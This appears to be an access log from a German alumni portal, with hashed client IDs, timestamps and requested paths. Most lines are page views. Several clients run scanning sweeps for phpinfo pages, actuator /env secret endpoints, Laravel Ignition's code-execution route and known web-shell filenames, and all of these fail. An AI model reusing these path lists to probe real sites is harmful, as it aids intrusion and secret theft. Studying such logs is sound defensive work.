d487a9c728e6d8eb50d8f3d6dd557df30fb31d6f9ca5c3a69151a83677af38ce;2025-11-17 15:39:12;;/;GET;200
a1925d4bbf3e7b9b7462bbb437f70a37dd98f164e8df91559cec498602b8942b;2025-11-17 15:48:05;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
f8eb23605636a87c898c3caa867df059f7a9df1f411ed9a2161e282d4a614587;2025-11-17 15:49:40;;/rechtliches/nutzungsbedingungen;GET;200
b0900b0a982e2e185afa5cbd8119e29d276d7197ca4595624f90ba612d97ce71;2025-11-17 15:53:57;;/personen/alumni/schule/5508;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-17 15:54:28;;/personen/alumni/schule/5826;GET;200
5e11d499fe23ac9de240003f69460cad8f0f70a4a22c9dfbc006768c41d27563;2025-11-17 15:55:27;;/personen/alumni/schule/5508;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-17 16:02:52;;/;GET;200
18d513a8d9e49b17e9b15b60f08dd0175c69ad4257c50bcb8c89b121e0e15683;2025-11-17 16:04:17;;/;GET;200
a02faaf7f0e0b5079988cf0d7776153a2fc67fc6db127548e16e15c03091127a;2025-11-17 16:05:13;;/about/allgemein;GET;200
fd972091eb58f4f8e3b9f8b898ee5f3b9a5a5ef6fd9ed0c37ee9903b1fb4b416;2025-11-17 16:19:29;;/personen/alumni/details/albert-hammig;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-17 16:22:23;/;/;GET;200
1b60b90089f7e91b413e2d5090d939af718f326e1e2eba83d89d5a6455990e02;2025-11-17 16:23:54;;/personen/alumni/schule/185826;GET;200
27ef086ef4b83bde65ced88fed602ddc37a459592f3dafa9cd95375608fff134;2025-11-17 16:25:17;;/;GET;200
6d90d6d23cf668bbe5d462daef7b02ea3f3e4efecb7e53b9f4dd878a17399a4c;2025-11-17 16:26:00;;/;GET;200
0fca79f68482044ece3211b6cac1192ccbe7daff0b811b5f1a06f05d233ad5b5;2025-11-17 16:37:28;;/personen/alumni/schule/610021;GET;200
8ed98f351d170b944e1fab2f89a2b7c07184f91dc81e31b18966a33bd620cb01;2025-11-17 16:48:21;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-17 16:52:28;/;/;GET;200
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:02:50;;/;GET;200
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:02:55;;/assets/@symfony/stimulus-bundle/controllers.js;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:02:57;;/assets/controllers/form-collection_controller.js;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:03:00;;/assets/controllers/hello_controller.js;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:03:17;;/assets/app/form.js;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:03:24;;/assets/@symfony/ux-turbo/turbo_controller.js;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:03:27;;/assets/app/core.js;GET;404
54e8f21c5dd81dbefc6cc794876e9824113493fea5141ed62e57bdfcccf29b5d;2025-11-17 17:04:18;;/xmlrpc.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:06:31;;/_profiler/phpinfo;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:06:31;;/phpinfo.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/pi.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/info2.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/info1.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/php_version.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/debug.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/server.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/php.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/i.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/serverinfo.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/phpinfo;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/info.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/php_info.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/test.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/phpversion.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/diagnostic.php;GET;404
34c727a2177552a78f3e55624027876c4605f9716ba5f8122eb8e7b6d1f9d221;2025-11-17 17:07:19;;/phptest.php;GET;404
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:27;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:29;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:31;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:34;;/aktuelles/stellenangebote;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:35;;/personen;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:37;;/themen/details/abschied-aus-moabit;GET;200
f019958bc2d88298bc8b4e34288253b25d2e07e345ffc7fb7d8a115ad467e10b;2025-11-17 17:10:40;;/themen/details/der-start-ins-studium;GET;200
5787a7e200aef57247f64ba78a6da88f6398aef64f46d61dce48ed8c793239f6;2025-11-17 17:17:00;;/profile;GET;302
8e88280c2ad5474b10d6a80c018bf7379d4ab41bca481248a7768bc59041d50f;2025-11-17 17:17:04;;/;GET;200
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:01;/env;/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:02;/mappings.json;/mappings.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:03;/info;/info;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:04;/env.json;/env.json;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:05;/actuator/;/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:05;/actuator/mappings;/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:06;/staging/mappings;/staging/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:06;/staging/actuator/env;/staging/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:07;/staging/actuator/mappings;/staging/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:08;/test/mappings;/test/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:09;/test/actuator/mappings;/test/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:10;/v2/actuator/mappings;/v2/actuator/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:10;/test/actuator/env;/test/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:11;/v2/actuator/env;/v2/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:12;/v2/mappings;/v2/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:13;/actuator/env;/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:14;/actuator/,/env;/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:15;/api/actuator/;/api/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:16;/api/actuator/env;/api/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:16;/api/actuator/,/env;/api/actuator/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:17;/management/;/management/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:17;/management/mappings;/management/mappings;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:18;/management/env;/management/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:18;/management/,/env;/management/,/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:19;/dev/actuator/;/dev/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:20;/dev/actuator/env;/dev/actuator/env;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:21;/app/actuator/;/app/actuator/;GET;404
4ca4a0417d99da8614395062ad11cfaf6c7cde04c09b2815259963173de182d2;2025-11-17 17:19:22;/app/actuator/env;/app/actuator/env;GET;404
1ecad5a6553ff7343ae047cecaedaf00ce57d145116ab2459d5e57e45c0c5a3f;2025-11-17 17:28:13;/aktuelles/meldungen/details/;/aktuelles/meldungen/details/;GET;301
33a7239c9cf42b4f595ebe35516da3541ec0cdb85774a82eac87a55adcf66936;2025-11-17 17:28:16;/aktuelles/meldungen/details;/aktuelles/meldungen/details;GET;500
4d594e973e3a2b8f518335c719ec16a07e37a3d993a1b74242286384ba5398f4;2025-11-17 17:32:14;;/;GET;200
cf8e4babf865946581ab480f1b651722ca984dec93c5008a9a659b1158056fd6;2025-11-17 17:36:01;;/media/cache/post_thumbnail/images/blogpost/pexels-rdne-8385033-1737843392.jpg;GET;404
5d647705f04c17832315e1a0b30861b113953c7d8ab9134365ce42adf9463488;2025-11-17 17:36:50;;/;GET;200
8affb5828293a93baf748217ab3b9089421340aad9719809eb133c1e6c8df4c7;2025-11-17 17:39:01;;/;GET;200
bfdc119c93ec2d68d6bc07f9750206a94552d90ce93c91912f75fcc1493c8edd;2025-11-17 17:44:56;;/suchergebnisse;GET;302
d0bb14f18df0999b6020093fe95d3521e6618e517f7332324660215e36ea509f;2025-11-17 17:46:27;;/;GET;200
d0bb14f18df0999b6020093fe95d3521e6618e517f7332324660215e36ea509f;2025-11-17 17:46:50;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
17afa17e96977fad86403723cc6a7a39ffd505b781ddb8c2a690a59a2937c079;2025-11-17 17:52:36;;/personen;GET;200
19f34f669cdd0033880345023c42fe3ed4775cbcc1b2a15146122167c39f44c4;2025-11-17 17:57:14;;/personen/alumni/schule/HS002;GET;200
380d7742379b851d607803b90372b36c4a74288c6f1a8fe09cef17bd8a35f567;2025-11-17 18:01:21;;/;GET;200
8a0d410f3d52aa6ab47e485fa1fc4060fa9f2aa0c06c667d2364c7588d7f82d9;2025-11-17 18:08:07;;/themen/details/der-start-ins-studium;GET;200
f1b9231857b0d3585bb64cb847cc999d70e12bb0672fd9bedbf58229f28b860a;2025-11-17 18:12:49;;/personen/alumni/schule/5503;GET;200
bba44843929d1a9c28fc40535c98b228b6a8909060d9cd0f0fd2f26fd973f60f;2025-11-17 18:18:46;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
2a123c242c44371930d1c4d8c75b23d6577a7c88c28d2d8d8db3a57b09924826;2025-11-17 18:20:59;;/personen/all/3;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-17 18:25:34;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
2f8c496429140c54199dd80f6b9aecd6b3b68660fb4fc9a49dc59ad906dceb5d;2025-11-17 18:29:45;;/personen/alumni/schule/5820;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-17 18:30:24;/personen/alumni/details/dilek-keskin;/personen/alumni/details/dilek-keskin;GET;200
61c91979a9acda478d72992664a23e16e40d5e44be6cfc6e1b1ea7405a80f4dc;2025-11-17 18:37:18;;/htmx/get;GET;405
3803854f4d43907b1b5e9fe3e86b8decea4834bf4f65d882f6e3fb1c0f4c8157;2025-11-17 18:37:52;;/personen/alumni/schule/5514;GET;200
4730cb30e93714e92d1d5b5198a746e1160bba66e349839de25fd4047335c54e;2025-11-17 18:42:32;;/reset-password;GET;200
61c91979a9acda478d72992664a23e16e40d5e44be6cfc6e1b1ea7405a80f4dc;2025-11-17 18:43:45;;/rechtliches/datenschutz;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-17 18:45:01;/themen/details/bucher-auf-dem-abstellgleis;/themen?category=kultur;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-17 18:46:29;/gruppen/hobby/finanzbildung;/gruppen/hobby/theater-und-schauspiel;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-17 18:46:31;/gruppen/hobby/finanzbildung;/gruppen;GET;200
d6a38198e257296124ab112e58a395650cfa155f1a58c93833785f84729c83dd;2025-11-17 18:48:32;;/personen/alumni/details/dilek-keskin;GET;200
d18c5230da4bb5a7744761c66b74c9af3834af29cdb07d21a03ed968b4d630f5;2025-11-17 18:51:50;;/;GET;200
37a02d8cd9fdd9c3129c04aed0791f0bd0441c3baf3da75db590027c0db49a75;2025-11-17 18:55:35;;/;GET;200
40a1f2283eff6bb3fd0a255ce6912665b2e683b9abe74cb630ef2b9d1ebc840f;2025-11-17 18:57:31;;/personen/alumni/details/sidney-dittrich;GET;200
78bb47ed5fff9f058ff33bf5bd98b32ed340bb3d9a792dd9a80293d28a8d74e2;2025-11-17 18:58:45;;/;GET;200
50291f8e4984fef821837d448f35306e12bacc5ab29eaae78685455b2491545e;2025-11-17 19:06:40;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-17 19:07:37;/themen/details/uni-zwischen-ebbe-und-flut;/themen?category=bildung;GET;200
6501dd602bca55e86ada953f90f049aad424924aca854675ce1239827af08d02;2025-11-17 19:08:32;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
c39ae3ba42ea0914d164d04f930d72262fb1b11b48995cce63f78d8f6a39e545;2025-11-17 19:09:01;;/personen/alumni/schule/4240404;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-17 19:09:04;/themen/details/uni-zwischen-ebbe-und-flut;/personen/alumni/schule/5826;GET;200
be934412f39b8fb8986a56dadcde3cda1d9101ada4cee3fa9a38c8aa8fb765f4;2025-11-17 19:13:29;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
c8e282c7136ca1d1163fa6120a3bade2dc67c9a9b581965bfef26b3aaedd7db4;2025-11-17 19:19:44;;/themen/details/hackerangriff-lauft-ins-leere;GET;200
4203a1fc9bb6f88d339af0dd5957c0f72fedb87ebcd6dfb78221b5fed2cbdc85;2025-11-17 19:22:54;;/sitemap.txt;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-17 19:23:20;/themen/details/uni-zwischen-ebbe-und-flut;/personen/alumni/schule/9004;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-17 19:23:29;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-17 19:28:18;;/aktuelles/meldungen?category=wissenschaft;GET;200
f7fc043231f14a1e4f478bfc1b603e77b30d93b188cfe4e2de1bffa270ef8cb4;2025-11-17 19:28:21;;/personen/alumni/schule/HS001;GET;200
c991efdb88be0258f086ab50cd03592e02a0f07efda2478b2606aeadf72327f2;2025-11-17 19:35:36;;/personen/alumni/schule/67210;GET;200
5270a16d7888b13c2459a59d3e6cb5ff017fbfa2df67c0519ef9c31b907a76fe;2025-11-17 19:38:29;;/personen/alumni/details/olaf-schaeffer;GET;200
ab7f2941fd12478abb730aeeee2e1eb92700a01b44c393d172fe843423ee1450;2025-11-17 19:44:23;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
18007e9ee8fb3a878a371aa1cbf9a18f0af868bbaa37daeeffacb30372ee39ce;2025-11-17 19:52:20;;/docs/uml/object_relations.md;GET;404
b3f0ad22bd92d456e8ac1abe456a7d0d319ad625b214904a198a955736cfb010;2025-11-17 19:58:23;;/gruppen/hobby/physik;GET;302
b3f0ad22bd92d456e8ac1abe456a7d0d319ad625b214904a198a955736cfb010;2025-11-17 19:58:27;/gruppen/hobby/physik;/gruppen;GET;200
11c51a670da8fc4d1624ceaa4a08e4f15e1be17bed84f486feea14adec7ad610;2025-11-17 19:59:05;;/veranstaltungen;GET;200
d1a183721693fa16978604f507eaed0a3b7a2fca433b88b1c2aa0c00624b8cf8;2025-11-17 20:10:05;;/personen/all/3;GET;200
457a06ae2be07054db17ebfbd3ca48db694c56374f72ea8922d30be15881a8c7;2025-11-17 20:10:10;;/personen/alumni/schule/5505;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-17 20:12:43;/themen/details/uni-zwischen-ebbe-und-flut;/personen/alumni/schule/5514;GET;200
0fe7db0bcec622b113379678a88881c90271c36238b8309cc911d0f1b35d31e3;2025-11-17 20:13:48;;/;GET;200
f444ff4a6421b45de7fec6582a365da9724b6c741b8fdc828888a57261350ede;2025-11-17 20:19:04;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-17 20:27:29;;/personen/alumni/schule/5508;GET;200
e082977394ca5041b1505f0b7c2134269e1977532d1d6fba3a2c6ac849f40f11;2025-11-17 20:27:29;;/sitemap.txt;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-17 20:30:49;/themen/details/uni-zwischen-ebbe-und-flut;/personen/alumni/schule/66345;GET;200
e6b9c298631270b805d7e9bc903567ef42e68c22f752ab9524781747e8a7c191;2025-11-17 20:34:39;;/;GET;200
d8684a2a9f8d78cb8d36338f7769e23fa41dee8de3cbb509629ee61a0fb130ce;2025-11-17 20:38:59;;/personen/alumni/schule/66345;GET;200
ce9e1982448ada8f5402e888511704c5bd90a59cd83f0d3ea57307ec35b6fdd7;2025-11-17 20:39:26;;/gruppen;GET;200
4971d8ba20b1bfdcd1f1c5cfcd3fbb74cfa0f8348581c596f770bcc330679728;2025-11-17 20:40:02;;/;GET;200
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:51;;/;HEAD;200
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:51;;/;GET;200
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:53;;/;GET;200
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:56;;/vendor/laravel-filemanager/js/script.js;GET;404
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:56;;/public/vendor/laravel-filemanager/js/script.js;GET;404
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:57;;/_ignition/execute-solution;GET;404
bb5b9534d6cba7ab0d3ac6147168da7373cc4370d7a017bbeb8b210844e31ec5;2025-11-17 20:41:58;;/public/_ignition/execute-solution;GET;404
d4903c41d93c8fb8ea3b71feb2858da18430b8137054541a5630568055fc3957;2025-11-17 20:42:15;;/;GET;200
2b20843fabeb6745e6718f8f6519a2bb061657390c71a511955b3d5e8f5637be;2025-11-17 20:43:58;;/personen/alumni/schule/0348;GET;200
d0daffc238918c25964f139056e8d4b808a085ebbe5bf6901d46e998539e5e04;2025-11-17 20:46:13;;/themen/details/abschied-aus-moabit;GET;200
f6512131e2cf8bd5d658004fd8a645c4aca60dd2ff3b22cd9a9a28f09ed9e261;2025-11-17 20:46:23;;/themen/details/david-gegen-goliath;GET;200
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:29;/;/form.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:30;/;/aa.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:30;/;/abcd.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:31;/;/admin.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:31;/;/.__info.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:32;/;/.bod/.ll/ss.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:33;/;/.well-known/.qiodetme.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:33;/;/info.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:34;/;/xmlrpc.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:35;/;/ALFA_DATA/admin.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:36;/;/aaa.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:36;/;/about.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:37;/;/admin/admin.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:37;/;/adminfuns.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:38;/;/akcc.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:39;/;/alfa.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:39;/;/build.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:40;/;/buy.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:41;/;/chosen.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:41;/;/classwithtostring.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:42;/;/default.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:43;/;/edit.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:43;/;/file.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:44;/;/filemanager.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:45;/;/flower.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:45;/;/function/function.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:46;/;/go.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:46;/;/images/index.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:47;/;/images/images/about.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:47;/;/ioxi-o.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:48;/;/mari.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:48;/;/moon.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:48;/;/nc4.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:49;/;/wp-admin/about.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:49;/;/wp-admin/css/colors/blue/index.php;GET;404
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-17 20:53:50;/;/;GET;200
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:50;/;/wp-content/upgrade/index.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:50;/;/wp-includes/style-engine/index.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:51;/;/xleet.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:52;/;/wp-admin/includes/;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:52;/;/wp-content/uploads/admin.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:53;/;/wp-good.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:53;/;/wp-includes/Text/Diff/Renderer/;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:54;/;/wp-includes/style-engine/;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:54;/;/xmrlpc.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:54;/;/asasx.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:55;/;/autoload_classmap.php;GET;404
a90f9738452927d3ac18846ffcf268ab0eafe3095da31aae2e31df1fe9596884;2025-11-17 20:53:55;/;/cong.php;GET;404
